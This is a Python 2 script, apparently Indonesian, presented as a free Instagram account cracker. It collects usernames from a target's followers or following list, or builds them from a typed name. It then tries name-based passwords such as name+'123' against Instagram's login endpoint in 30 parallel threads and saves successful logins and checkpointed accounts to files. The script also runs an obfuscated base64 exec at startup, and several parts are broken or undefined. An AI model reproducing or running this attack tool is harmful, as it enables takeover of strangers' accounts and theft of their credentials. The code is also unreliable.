#!/usr/bin/python2
# coding=utf-8

Hj = '\x1b[0;32m' 
Mt = '\x1b[0;33m' 

ingfo = (
"""%s
 • Info script :
 	
 - Script Crack Instagram Gratis By Yulia Ulfa
 
%s"""%(Hj,Mt))

import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
    
import requests, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64, uuid
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
from calendar import monthrange

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

reload(sys)
sys.setdefaultencoding('utf-8')

# WARNA
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P]
warna = random.choice(acak)
til ="•" 
ok, cp, id, user, mi, status_foll, poll, cr, looping, loop = [], [], [], [], [], [], [], [], 1, 0
platform1 = str(platform.platform()).lower()
p1 = base64.b64encode(platform1)

url_instagram = "https://www.instagram.com/"
user_agent = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agent_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agent_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
headerz = {"User-Agent": user_agent}
headerz_api = {"User-Agent": user_agent_api}

def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
def clear():
	os.system("clear")
def folder():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = open('data/ua.txt', 'r').read()
	except KeyError,IOError:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# Banner
IP = requests.get("https://api.ipify.org/").text
exec(base64.b64decode('YXV0aG9yID0iUm9taSBBZnJpemFsIgpmYl9tZSA9ImZhY2Vib29rLmNvbS9yb21pLmFmcml6YWwuMTAyIgpnaXRodWIgPSJnaXRodWIuY29tL01hcmstWnVjayI='))
def banner(): 
    print ("""\n\x1b[0;32m
╔╗──╔╦╗─╔╦╗──╔══╦═══╗╔╗─╔╦╗──╔═══╦═══╗
║╚╗╔╝║║─║║║──╚╣╠╣╔═╗║║║─║║║──║╔══╣╔═╗║
╚╗╚╝╔╣║─║║║───║║║║─║║║║─║║║──║╚══╣║─║║
 ╚╗╔╝║║─║║║─╔╗║║║╚═╝║║║─║║║─╔╣╔══╣╚═╝║
──║║─║╚═╝║╚═╝╠╣╠╣╔═╗║║╚═╝║╚═╝║║──║╔═╗║
──╚╝─╚═══╩═══╩══╩╝─╚╝╚═══╩═══╩╝──╚╝─╚╝"""))
    print ("""\x1b[0;37m────────────────────────────────────────────────────
\x1b[0;37m [\x1b[0;32m•\x1b[0;37m]\x1b[0;33m Nama     : Yulia Ulfa
\x1b[0;37m [\x1b[0;32m•\x1b[0;37m]\x1b[0;33m Github   : https://github.com/Yuliaulfa
\x1b[0;37m [\x1b[0;32m•\x1b[0;37m]\x1b[0;33m Facebook : https://www.facebook.com/Yuliaulfax
\x1b[0;37m────────────────────────────────────────────────────""")) 
    print (' %s#%s IP   %s:%s %s%s '%(U,O,M,O,IP,M))

# TOKEN
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def login():
    os.system('clear');banner()
    print ('\n%s%s%s 01 %sLogin instagram (crack akun instagram) \n%s%s%s 00 %sKeluar'%(U,til,K,O,U,til,K,O,U,til,K,O,U,til,M,O))
    rom = raw_input ("\n%s# %sPilih : %s> %s"%(P,O,M,K))
    if rom in(""):
    	print("%s%s wrong input "%(M,til));exit()
    elif rom in ('1','01'):
    	log_igeh()
    	menu_igeh()
    else:
    	print("%s%s wrong input "%(M,til));exit()

# LOGIN INSTAGRAM 
def log_igeh():
	global cookie
	try:
		kanjutz = open("data/ig.txt", "r").read()
	except IOError:
		login_ig()
	else:	
		url = "https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5"
		with requests.Session() as ses:
			try:
				otw = ses.get(url, cookies={"cookie": kanjutz}, headers=headerz_api)
				if "users" in json.loads(otw.content):
					cookie = {"cookie": kanjutz}
				else:
					print ("\n%s%s Cookie invalid "%(M,til));jeda(2)
					os.system('rm -rf data/ig.txt')
					login_ig()	
			except ValueError:
				print ("\n%s%s Cookie invalid "%(M,til));jeda(2)
				os.system('rm -rf data/ig.txt')
				login_ig()
def login_ig():
	global cookie
	print ("\n%s•%s Masuk dengan akun instagram anda "%(U,O))
	userrr = raw_input('%s%s %susername%s > %s'%(U,til,O,M,K))
	paswot = raw_input('%s%s %spassword%s > %s'%(U,til,O,M,K))
	try:
		try:
			headerz = {"User-Agent": user_agent}
			with requests.Session() as ses:
				scr = "https://www.instagram.com/"
				data = ses.get(scr, headers=headerz).content
				token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			headerss = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": token,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agent,}
			param = {"username": userrr,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), paswot),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
			}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses.post(url, data=param, headers=headerss)
			data = json.loads(respon.content)
			_2 = respon.cookies.get_dict()
			if "userId" in str(data):
				for bff in _2:
					with open("data/ig.txt", "a") as simpan:
						simpan.write(bff+"="+_2[bff]+";")
				#follow(ses, user)
				kanjutz = open("data/ig.txt","r").read()
				cookie = {"data/ig.txt": kanjutz}
				print ('');jeda(2)
				print ('%s%s Login succes, jalankan lagi script nya'%(H,til));exit()
			elif "checkpoint_url" in str(data):
				print ('\n%s%s Akun terkena checkpoint'%(M,til));jeda(2)
			elif "Please wait" in str(data):
				print ('\n%s%s Aktifkan mode pesawat beberapa detik '%(M,til));jeda(2)
			else:
				print ('\n%s%s Login gagal, silahkan coba lagi '%(M,til));jeda(2)
				exit()
	except KeyboardInterrupt:
		exit()
None

# FOLLOWERS IG
def r_ikut(cookie, id_target, limit, lpg):
	global looping
	if lpg in[""]:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);exit()
	elif lpg in["1","01"]:
		url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
	elif lpg in["2","02"]:
		url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
	else:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);exit()
	with requests.Session() as ses:
		otw = ses.get(url, cookies=cookie, headers=headerz_api)
		for _j_ in json.loads(otw.content)["users"]:
			username = _j_["username"]
			nama = _j_["full_name"].encode("utf-8")
			if len(status_foll) != 1:
				print "\r%s•%s Total user%s > %s%s"%(U,O,M,K,len(mi)),
				sys.stdout.flush()
				momok.append(username+"|"+nama.decode("utf-8"))
				looping+=1
			else:
				poll.append(username)
None
# USER AGENT 
ugent = random.choice([
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
"NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
"Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
"Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
"[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"
])

# MENU
def menu_igeh():
	print ('\n%s•%s 01 %sCrack followers public'%(U,P,O))
	print ('%s•%s 02 %sCrack pencarian nama'%(U,P,O))
	print ('%s•%s 03 %sCek hasil crack'%(U,P,O))
	print ('%s•%s rm %sHapus akun '%(U,P,O))
	print ('%s•%s 00 %sKembali'%(U,M,O))
	kanjutz_ = raw_input('\n%s# %sPilih %s> %s'%(P,O,M,K))
	if kanjutz_ in['']:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);exit()
	elif kanjutz_ in['1','01']:
		pw = ""
		status = ""
		username = raw_input('\n%s%s %sUser target%s > %s'%(U,til,O,M,K))
		ingfo(username, pw, status)
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		print ('%s•%s 01%s Followers %s> %s%s'%(U,P,O,M,K,str(Followers)))
		print ('%s•%s 02%s Following %s> %s%s'%(U,P,O,M,K,str(Following)))
		rm = raw_input('\n%s# %sPilih %s> %s'%(P,O,M,K))
		limit = input('\n%s%s %sLimit user%s > %s'%(U,til,O,M,K))
		if rm in['']:
			print '\n%s%s isi yang benar'%(M,til)
		elif rm in['1','01']:
			r_ikut(cookie, idg, limit, rm) 
			print ""
			proses()
			paswot()
		elif rm in['2','02']:
			r_ikut(cookie, idg, limit, rm) 
			print""
			proses()
			paswot()
		else:
			print '\n%s%s isi yang benar'%(M,til);jeda(2);menu_igeh()
	elif kanjutz_ in['2','02']:
		usr_ = raw_input('\n%s%s %smasukan nama%s > %s'%(U,til,O,M,K))
		jumlah = input('%s%s %sLimit user%s > %s'%(U,til,O,M,K))
		bulubaok = usr_.replace(" ", "")
		cr.append("asw_lu")
		momok.append(bulubaok+"|"+bulubaok)
		momok.append(bulubaok+"_"+"|"+bulubaok)
		for _i_ in range(1, jumlah+1):
			momok.append(bulubaok+str(_i_)+"|"+bulubaok)
			momok.append(bulubaok+"_"+str(_i_)+"|"+bulubaok)
			momok.append(bulubaok+str(_i_)+"_"+"|"+bulubaok)
		proses()
		paswot()
	elif kanjutz_ in['3','03']:
		hasil_igeh()
	elif kanjutz_ in['rm','Rm','RM']:
		k = raw_input("\n\033[1;95m•\033[1;96m ingin menghapus akun instagram? y/n : ")
		if k in ["y", "Y"]:
			print('')
			s = ['.   ', '..  ', '... ']
			for m in s:
				print '\r\x1b[1;95m•\x1b[1;96m menghapus akun ' + m,
				sys.stdout.flush();jeda(1)
			os.system('rm -rf data/ig.txt')
			lempang('\n%s%s berhasil terhapus '%(H,til));exit()
		else:
			print '\n%s%s%s lempangkan ulang tools nya'%(M,til,O);jeda(2)
	elif kanjutz_ in['0','00']:
		menu()
		#exit()
	else:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);menu_igeh()

# CEK HASIL IG
def hasil_igeh():
	print ("\n%s%s%s 01 %sCek hasil akun %sOK "%(U,til,P,O,H))
	print ("%s%s%s 02 %sCek hasil akun %sCP "%(U,til,P,O,K))
	while True:
		rom = raw_input('\n%s# %sPilih %s> %s'%(P,O,M,K))
		if rom in['1','01']:
			try:
				oke = open("OK.txt", "r").readlines()
				print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
				print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
				print ("%s• %sJumlah %s: %s%s"%(U,O,M,H,str(len(oke))))
				print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,H));jeda(2)
				okek = open("OK.txt", "r").read()
				print (okek)
				exit(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
			except IOError,KeyError:
				exit (M+"\n• tidak ada hasil awokawokawok")
		if rom in['2','02']:
			try:
				cepe = open("CP.txt", "r").readlines()
				print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
				print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
				print ("%s• %sJumlah %s: %s%s"%(U,O,M,K,str(len(cepe))))
				print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
				cepek = open("CP.txt", "r").read()
				print (cepek)
				exit(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
			except IOError,KeyError:
				exit (M+"\n• tidak ada hasil awokawokawok")

# CRACK IG
def proses():
	print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %s%s'%(U,til,O,H,O,M,H,"OK.txt"));jeda(0.2)
	print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %s%s'%(U,til,O,M,K,M,O,M,K,"CP.txt"));jeda(0.2)
	print ('%s!%s crack berjalan, tekan CTRL+Z untuk berhenti\n'%(U,O));jeda(0.2)
def crack2(user, pwx):
	global looping, loping
	c_yul_ = len(pwx)
	for pas in pwx:
		if looping != 1:
			pass
		else:
			if len(status_foll) != 1:
				print "\r \033[1;96m*--> %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
				sys.stdout.flush()
				c_yul_ -= 1
			else:
				pass
		try:
			if user in ok or user in cp:
				break
			pw = pas.lower()
			try:
				headerz = {"User-Agent": user_agent_api}
				with requests.Session() as ses:
					urll = "https://www.instagram.com/"
					data = ses.get(urll, headers=headerz).content
					tokenz = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokenz,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agent,
						 }
				param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			with requests.Session() as ses:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses.post(url, data=param, headers=header)
				data = json.loads(respon.content);jeda(00.1)
				# print ("\r",data)
				# print ("\r *--> %s,%s,|,%s,%s            "%(P,user,H,pw))
				if "checkpoint_url" in str(data):
					CP = "Checkpoint"
					ingfo(user, pw, CP)
					with open("CP.txt", "a") as simpan:
						simpan.write(" [Checkpoint] "+user+"|"+pw+"\n")
					cp.append(user)
					break
				elif "userId" in str(data):
					OK = "Berhasil"
					if len(status_foll) != 1:
						ingfo(user, pw, OK)
						with open("OK.txt", "a")as simpan:
							simpan.write(" [Berhasil] "+user+"|"+pw+"\n")
						ok.append(user)
						#follow(ses,user)
					break
				elif "Please wait" in str(data):
					print ("\r%s ! Mode pesawatkan 2 detik  "%(M)),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
					loping -= 1
				else:
					looping = 1
					pass
		except requests.exceptions.ConnectionError:
			print ("\r%s ! Tidak ada koneksi Internet "%(M)),
			sys.stdout.flush()
			looping+=1
			pwx = [pw]
			crack2(user, pwx)
			loping -= 1
		except:
			looping = 1
			pass
	loping+=1
None

# PASSWORD IG
def paswot():
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_yul_ = []
				_r_ = ro.encode("utf-8")
				_o_ = _r_.split("|")[0]
				_m_ = _r_.split("|")[1]
				_i_ = _m_.split()
				if len(cr) != 1:
					if len(_o_) >= 6:
						_yul_.append(_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_yul_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_yul_.append(_m_)
						else:
							_yul_.append(_i_[0]+"123")
							if len(_i_) >= 2:
								_yul_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_yul_.append(_m_)
					else:
						_yul_.append(_o_+_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_yul_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_yul_.append(_m_)
						else:
							if len(_i_) >= 2:
								_yul_.append(_i_[0]+_i_[1])
							_yul_.append(_i_[0]+"123")
							if len(_m_) >= 6:
								_yul_.append(_m_)
				else:
					_yul_.append(_i_[0]+"123")
					_yul_.append(_i_[0]+"12345")
					_yul_.append(_o_)
				log.submit(crack2, _o_, _yul_)
			except: pass
	exit("%s• finished"%(H))
def ingfo(user, pw, status):
	try:
		global idg, Followers, Following
		dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user), headers={"User-Agent": user_agent})
		dta_ = dta.json()["graphql"]["user"]
		nama = dta_["full_name"].encode("utf-8")
		idg = dta_["id"]
		Followers = dta_["edge_followed_by"]["count"]
		Following = dta_["edge_follow"]["count"]
		if status == "Berhasil":
			print ("\r%s [√] Berhasil                   "%(H))
			print ("\r%s [√] Nama akun %s> %s%s          "%(H,M,H,str(nama)))
			print ("\r%s [√] Followers  %s> %s%s          "%(H,M,H,str(Followers)))
			print ("\r%s [√] Following %s> %s%s          "%(H,M,H,str(Following)))
			print ("\r%s [√] Username  %s> %s%s          "%(H,M,H,user))
			print ("\r%s [√] Password  %s> %s%s          \n"%(H,M,H,pw))
		elif status == "Checkpoint":
			print ("\r%s [×] Checkpoint                 "%(K))
			print ("\r%s [×] Nama akun %s> %s%s          "%(K,M,K,str(nama)))
			print ("\r%s [×] Followers  %s> %s%s          "%(K,M,K,str(Followers)))
			print ("\r%s [×] Following %s> %s%s         "%(K,M,K,str(Following)))
			print ("\r%s [×] Username  %s> %s%s         "%(K,M,K,user))
			print ("\r%s [×] Password  %s> %s%s          \n"%(K,M,K,pw))
		else:
			pass
	except: pass
None
loping= 1

if __name__ == '__main__':
	os.system("git pull")
	folder()
	menu()